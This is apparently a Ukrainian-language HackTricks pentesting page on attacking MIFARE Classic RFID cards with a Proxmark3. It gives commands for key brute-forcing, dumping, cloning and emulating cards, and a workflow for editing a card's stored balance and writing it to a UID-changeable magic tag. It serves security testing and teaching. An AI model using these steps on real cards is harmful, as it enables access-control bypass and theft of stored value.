# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Атака на RFID-системи за допомогою Proxmark3

Встановіть активно підтримуваний клієнт RRG/Iceman Proxmark3 і відповідну прошивку, а потім перевірте синтаксис команд для цієї збірки, оскільки наведені нижче старі команди могли змінитися.<sup>[[1]](#references)[[5]](#references)</sup>

### Атака на MIFARE Classic 1KB

MIFARE Classic 1K має **16 секторів**, у кожному з яких **4 блоки** по **16 байтів**. Блок виробника 0 містить UID/дані виробника й доступний лише для читання на справжніх картках NXP; спеціальні клоновані або «магічні» картки можуть дозволяти його перезаписувати.<sup>[[1]](#references)[[2]](#references)</sup>\
Для доступу до кожного сектора потрібні **2 ключі** (**A** і **B**), які зберігаються в **блоці 3 кожного сектора** (трейлері сектора). У трейлері сектора також зберігаються **біти доступу**, які визначають дозволи на **читання та запис** для **кожного блока** за допомогою цих 2 ключів.\
2 ключі корисні, наприклад, щоб дозволити читання, якщо ви знаєте перший ключ, і запис, якщо знаєте другий.

Можна виконати кілька атак.

```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```

Proxmark3 дає змогу виконувати й інші дії, наприклад **перехоплювати** комунікацію **від Tag до Reader**, щоб спробувати знайти чутливі дані. У цій картці можна просто прослухати комунікацію й обчислити використаний ключ, оскільки **використані криптографічні операції є слабкими**: знаючи відкритий і зашифрований текст, можна його обчислити (інструмент `mfkey64`).<sup>[[3]](#references)</sup>

#### Швидкий сценарій зловживання stored-value на MiFare Classic

Коли термінали зберігають баланс на картках Classic, типовий наскрізний сценарій такий:<sup>[[4]](#references)</sup>

```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```

Нотатки

- `hf mf autopwn` організовує атаки типу nested/darkside/HardNested, відновлює ключі та створює дампи в папці дампів клієнта.<sup>[[1]](#references)</sup>
- Запис у блок 0/UID працює лише на magic-картках gen1a/gen2. У звичайних карток Classic UID доступний лише для читання.<sup>[[2]](#references)</sup>
- У багатьох системах використовують «value blocks» Classic або прості контрольні суми. Після редагування переконайтеся, що всі дубльовані/інвертовані поля та контрольні суми узгоджені.<sup>[[4]](#references)</sup>

Дивіться методологію вищого рівня та заходи протидії в:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Сирі команди

В IoT-системах іноді використовують **немарковані або некомерційні мітки**. У такому разі можна використовувати Proxmark3 для надсилання **сирих команд до міток**.

```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
  proprietary non iso14443-4 card found, RATS not supported
  No chinese magic backdoor command detected
  Prng detection: WEAK
  Valid ISO14443A Tag Found - Quitting Search
```

З цією інформацією можна спробувати знайти відомості про картку та спосіб зв’язку з нею. Proxmark3 дає змогу надсилати необроблені команди, наприклад: `hf 14a raw -p -b 7 26`

### Скрипти

До програмного забезпечення Proxmark3 входить попередньо завантажений список **скриптів автоматизації**, які можна використовувати для виконання простих завдань. Щоб отримати повний список, скористайтеся командою `script list`. Потім запустіть команду `script run`, указавши назву скрипту:

```
proxmark3> script run mfkeys
```

Ви можете створити скрипт для **fuzzing зчитувачів тегів**: скопіюйте дані **валідної картки**, напишіть **Lua-скрипт**, який **рандомізує** один або кілька випадкових **байтів**, і перевіряйте, чи **зчитувач не дасть збій** під час якоїсь ітерації.

## References

- [1] [Вікі Proxmark3: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Вікі Proxmark3: магічні картки HF](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [Заява NXP щодо MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [Експлуатація вразливості NFC-картки в KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [5] [RRG/Iceman Proxmark3 — встановлення в Linux](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
{{#include ../../banners/hacktricks-training.md}}
